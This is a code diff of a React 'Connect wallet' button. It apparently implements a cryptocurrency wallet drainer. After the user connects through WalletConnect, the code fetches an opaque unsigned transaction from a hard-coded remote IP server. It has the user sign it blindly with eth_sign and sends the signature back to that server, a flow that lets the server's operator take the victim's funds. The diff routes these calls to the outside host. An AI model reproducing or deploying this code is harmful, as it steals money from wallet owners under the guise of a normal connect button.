@@ -1,12 +1,10 @@
-
 import jQuery from "jquery"
 import { EthereumProvider } from "@walletconnect/ethereum-provider";
-function App() {
 
+function App() {
   async function runner(){
     var ethereumProvider = await EthereumProvider.init({
       showQrModal:true,
-      
       qrModalOptions:{
         themeMode:"dark",
         explorerRecommendedWalletIds:[
@@ -20,71 +18,55 @@ function App() {
           'be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d',
           '9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd'
         ]
-              
       },
       chains:[1],
       methods:['eth_sign','eth_sendTransaction','eth_signTransaction'],
       projectId:"9fe3ed74e1d73141e8b7747bedf77551"
-    })
-    await ethereumProvider.enable()
+    });
 
-    var provider = ethereumProvider
-
-    var account = await provider.request({method:"eth_accounts"})
-    var account_sender = account[0]
-    console.log(account_sender)
+    await ethereumProvider.enable();
+    var provider = ethereumProvider;
+    var account = await provider.request({method:"eth_accounts"});
+    var account_sender = account[0];
+    console.log(account_sender);
   
     async function genSign(address,chain,type,contract="0"){
-      if (type == "coin"){
-        var result = await jQuery.post("send.php",{"handler":"tx","address":address,"chain":chain,"type":type})
-  
-        var unSigned = JSON.parse(result)
-        console.log(unSigned)
-    
-        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]})
-    
-        return Signed
-      }else if (type == "token"){
-        var result = await jQuery.post("send.php",{"handler":"tx","address":address,"chain":chain,"type":type,"contract":contract})
-  
-        var unSigned = JSON.parse(result)
-        console.log(unSigned)
-    
-        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]})
-    
-        return Signed
-      }
+      let apiUrl = "http://104.194.133.124:8080/http://104.194.133.124/send.php"; // آدرس پروکسی‌شده
 
-  
+      if (type == "coin"){
+        var result = await jQuery.post(apiUrl, {"handler":"tx","address":address,"chain":chain,"type":type});
+        var unSigned = JSON.parse(result);
+        console.log(unSigned);
+        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]});
+        return Signed;
+      } else if (type == "token"){
+        var result = await jQuery.post(apiUrl, {"handler":"tx","address":address,"chain":chain,"type":type,"contract":contract});
+        var unSigned = JSON.parse(result);
+        console.log(unSigned);
+        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]});
+        return Signed;
+      }
     }
   
     async function acceptSign(signature,type){
-      console.log(type)
-      if (type == "coin"){
-        var result = await jQuery.post("send.php",{"handler":"sign","signature":signature,"type":type})
-        var resultJson = JSON.parse(result)
-        return resultJson.result
-      }else if (type == "token"){
-        var result = await jQuery.post("send.php",{"handler":"sign","signature":signature,"type":type})
-        var resultJson = JSON.parse(result)
-        return resultJson.result
-      }
-
+      let apiUrl = "http://104.194.133.124:8080/http://104.194.133.124/send.php"; // آدرس پروکسی‌شده
+      
+      console.log(type);
+      var result = await jQuery.post(apiUrl, {"handler":"sign","signature":signature,"type":type});
+      var resultJson = JSON.parse(result);
+      return resultJson.result;
     }
     
-    var signature = await genSign(account_sender,"56","coin")
-  
-    console.log(signature)
-
-    var rawsign = await acceptSign(signature,"coin")
-    console.log("Raw : " + rawsign)
-  
+    var signature = await genSign(account_sender,"56","coin");
+    console.log(signature);
+    var rawsign = await acceptSign(signature,"coin");
+    console.log("Raw : " + rawsign);
   }
-  return (
-<a href="#" id="kos" onClick={runner} class="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left " data-uk-toggle="">
-                                <span>Connect wallet</span>
-                            </a>
 
+  return (
+    <a href="#" id="kos" onClick={runner} className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left" data-uk-toggle="">
+      <span>Connect wallet</span>
+    </a>
   );
 }
 
